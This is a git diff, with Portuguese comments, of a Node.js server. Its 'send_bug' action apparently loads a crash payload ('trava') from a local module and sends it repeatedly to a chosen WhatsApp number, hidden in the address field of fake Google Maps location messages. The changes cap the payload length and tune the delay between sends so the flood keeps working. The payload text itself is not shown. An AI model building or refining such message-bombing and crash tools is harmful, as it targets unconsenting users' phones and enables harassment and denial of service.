@@ -141,7 +141,7 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo exclusivo para arquivos .JS gerando o Card de Localização Nativa
+                // Disparo exclusivo utilizando Módulos .JS com Localização Nativa
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivo = extraData.file;
@@ -150,19 +150,17 @@ const server = http.createServer(async (req, res) => {
                     let conteudoPayload = "⚠️ Payload ZRX";
 
                     try {
-                        // Força a leitura estritamente de módulos .js
                         const nomeModulo = nomeArquivo.replace(/\.js$/, '');
                         const caminhoAbsoluto = path.join(__dirname, `${nomeModulo}.js`);
 
                         if (fs.existsSync(caminhoAbsoluto)) {
-                            // Limpa o cache para sempre ler a versão mais recente do arquivo JS
+                            // Limpa o cache para recarregar o arquivo do repositório
                             delete require.cache[require.resolve(`./${nomeModulo}`)];
                             const modulo = require(`./${nomeModulo}`);
 
                             if (typeof modulo === 'string') {
                                 conteudoPayload = modulo;
                             } else if (typeof modulo === 'object' && modulo !== null) {
-                                // Puxa qualquer variável exportada no arquivo JS (independente do nome escolhido)
                                 const chaves = Object.keys(modulo);
                                 if (chaves.length > 0) {
                                     conteudoPayload = modulo[chaves[0]];
@@ -171,24 +169,30 @@ const server = http.createServer(async (req, res) => {
                                 }
                             }
                         } else {
-                            console.error(`Arquivo JS não encontrado: ${caminhoAbsoluto}`);
+                            console.error(`Arquivo JS não encontrado no diretório: ${caminhoAbsoluto}`);
                         }
                     } catch (err) {
-                        console.error("Erro ao carregar módulo .js:", err.message);
+                        console.error("Erro ao carregar o módulo JavaScript:", err.message);
                     }
 
+                    // Trata a string para evitar que estoure o limite de caracteres por mensagem de localização
+                    const addressPayload = (typeof conteudoPayload === 'string' && conteudoPayload.length > 35000)
+                        ? conteudoPayload.substring(0, 35000)
+                        : conteudoPayload;
+
                     for (let i = 0; i < quantidade; i++) {
-                        // Dispara como Localização Nativa para forçar o mapa e injetar a trava no endereço
+                        // Envia como mensagem de Localização Nativa (Gera a caixa do Mapa)
                         await waSock.sendMessage(targetJid, {
                             location: {
                                 degreesLatitude: -23.550520,
                                 degreesLongitude: -46.633308,
                                 name: "Google Maps",
-                                address: conteudoPayload
+                                address: addressPayload
                             }
                         });
                         
-                        await delay(3000);
+                        // Intervalo seguro de 3,5 segundos para evitar erros de criptografia
+                        await delay(3500);
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
